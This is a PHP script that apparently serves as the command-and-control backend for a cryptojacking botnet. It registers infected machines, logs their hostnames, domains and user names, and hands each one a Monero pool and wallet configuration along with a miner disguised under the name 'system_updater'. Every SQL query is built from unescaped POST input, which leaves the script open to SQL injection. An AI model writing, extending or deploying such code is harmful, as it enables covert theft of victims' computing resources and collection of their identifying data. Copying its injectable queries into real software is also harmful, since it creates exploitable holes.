<?php
include("../sql_connect.php");
$connection = GetConnection();

if($_SERVER["REQUEST_METHOD"] == "POST")
{
    $action = isset($_POST['action']) ? $_POST['action'] : '';

    /* DEFAULT CONFIG FILE */
    $_CONFIG_MINER_FILE = "system_updater";
    $_CONFIG_PORT = "4444";
    $_CONFIG_POOL_ADRESS = "pool.minexmr.com:443";
    $_CONFIG_WALLET_ADRESS = "45QNrDDCXPAdh87hS8FuXKKdXkxS3p8kg5GjWY5hfhk3F3RcuTKkowiLPdkjujUUeHibzCo1RribBiGC9xKvfFLR4fLeKGr";
    $_CONFIG_OPENCL = "0";
    $_CONFIG_CUDA = "0";

    /* DEVICE FIELDS */
    $device_id = isset($_POST['device_id']) ? $_POST['device_id'] : '';
    $machine_name = isset($_POST['machine_name']) ? $_POST['machine_name'] : '';
    $os_version = isset($_POST['os_version']) ? $_POST['os_version'] : '';
    $user_domain_name = isset($_POST['user_domain_name']) ? $_POST['user_domain_name'] : '';
    $user_name = isset($_POST['user_name']) ? $_POST['user_name'] : '';
    $last_seen = isset($_POST['last_seen']) ? $_POST['last_seen'] : '';

    /* GET CONFIG FILE */
    if($action == "get_config_file")
    {
        $sql = "SELECT device_id,miner_file,port,pool_adress,wallet_adress,opencl,cuda FROM device_config WHERE device_id='{$device_id}'";
        $result =$connection->query($sql);

        if($result->num_rows > 0)
        {
            while($row = $result->fetch_assoc())
            {
                echo "device_id=".$row["device_id"].",";
                echo "miner_file=".$row["miner_file"].",";
                echo "port=".$row["port"].",";
                echo "pool_adress=".$row["pool_adress"].",";
                echo "wallet_adress=".$row["wallet_adress"].",";
                echo "opencl=".$row["opencl"].",";
                echo "cuda=".$row["cuda"];
            }
        }
        else
        {
            echo "get_config_file error";
        }
    }

    /* CREATE NEW DEVICE */
    if($action == "create_new_device") 
    { 
        $sql = "INSERT INTO devices (device_id,machine_name,os_version,user_domain_name,user_name) VALUES ('{$device_id}','{$machine_name}','{$os_version}','{$user_domain_name}','{$user_name}')";
        
        // Set default config file 
        if($connection->query($sql))
        {
            $sql = "INSERT INTO device_config (device_id,miner_file,port,pool_adress,wallet_adress,opencl,cuda) VALUES ('{$device_id}','{$_CONFIG_MINER_FILE}','{$_CONFIG_PORT}','{$_CONFIG_POOL_ADRESS}','{$_CONFIG_WALLET_ADRESS}','{$_CONFIG_OPENCL}','{$_CONFIG_CUDA}')";

            if($connection->query($sql))
            {
                echo "True";
            }
            else
            {
               echo "create_new_device error_config";
            }
        }
        else
        {
            echo "create_new_device error";
        }
    }

    /* UPDATE LAST TIME ONLINE */
    if($action == "set_last_seen")
    {
        $sql = "UPDATE devices SET last_seen='{$last_seen}' WHERE device_id='{$device_id}'";

        if($connection->query($sql))
        {
            echo "True";
        }
        else
        {
            echo "set_last_seen error";
        }
    }

    /* GET DEVICE */
    if($action == "get_device")
    {
        echo "get_device"; 
    }
}
?>